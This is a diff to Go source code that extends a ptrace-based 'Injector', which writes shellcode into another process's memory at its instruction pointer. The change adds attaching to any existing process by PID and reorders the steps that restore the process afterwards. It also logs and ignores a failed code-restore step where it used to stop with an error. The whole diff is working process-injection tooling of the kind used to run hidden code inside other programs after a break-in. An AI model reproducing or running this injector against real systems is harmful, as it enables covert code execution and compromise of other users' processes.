@@ -5,7 +5,9 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"strings"
 	"syscall"
@@ -98,8 +100,8 @@ if sc_size <= mem_size:
 	return nil
 }
 
+// Injector inject shellcode to arbitrary running process
 // target process will be restored after shellcode has done its job
-// TODO
 func Injector(shellcode *string, pid int) error {
 	// format
 	*shellcode = strings.Replace(*shellcode, ",", "", -1)
@@ -130,21 +132,32 @@ func Injector(shellcode *string, pid int) error {
 		if err != nil {
 			log.Printf("child process wait: %v", err)
 		}
-		log.Printf("Injector: attached to child process (%d)", pid)
+		log.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
 	} else {
-		// start a child process to inject shellcode into
+		// attach to an existing process
+		proc, err := os.FindProcess(pid)
+		if err != nil {
+			return fmt.Errorf("%d does not exist: %v", pid, err)
+		}
+		pid = proc.Pid
+		runtime.LockOSThread()
+		defer runtime.UnlockOSThread()
 		err = syscall.PtraceAttach(pid)
 		if err != nil {
 			return fmt.Errorf("ptrace attach: %v", err)
 		}
-		log.Printf("Injector: attached to %d", pid)
+		_, err = proc.Wait()
+		if err != nil {
+			return fmt.Errorf("Wait %d: %v", pid, err)
+		}
+		log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
 	}
 
 	// read RIP
 	regs := &syscall.PtraceRegs{}
 	err = syscall.PtraceGetRegs(pid, regs)
 	if err != nil {
-		return fmt.Errorf("read regs from %d: %v", pid, err)
+		return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
 	}
 	origRip := regs.Rip
 	log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)
@@ -205,20 +218,28 @@ func Injector(shellcode *string, pid int) error {
 		if err != nil {
 			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		log.Printf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
-
-		// breakpoint hit, restore the process
-		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
+		return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), regs.Rip)
+	case ws.Stopped():
+		err = syscall.PtraceGetRegs(pid, regs)
 		if err != nil {
-			return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
+			return fmt.Errorf("read regs from %d: %v", pid, err)
 		}
-		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
+		log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), regs.Rip)
 
 		// restore registers
 		err = syscall.PtraceSetRegs(pid, regs)
 		if err != nil {
 			return fmt.Errorf("Restoring process: set regs: %v", err)
 		}
+
+		// breakpoint hit, restore the process
+		n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
+		if err != nil {
+			// return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
+			// FIXME unable to restore process, we have to ignore this error
+			log.Printf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
+		}
+		log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
 
 		// continue and wait
 		err = syscall.PtraceCont(pid, 0)
@@ -231,12 +252,6 @@ func Injector(shellcode *string, pid int) error {
 		}
 
 		return nil
-	case ws.Stopped():
-		err = syscall.PtraceGetRegs(pid, regs)
-		if err != nil {
-			return fmt.Errorf("read regs from %d: %v", pid, err)
-		}
-		return fmt.Errorf("continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), regs.Rip)
 	default:
 		err = syscall.PtraceGetRegs(pid, regs)
 		if err != nil {
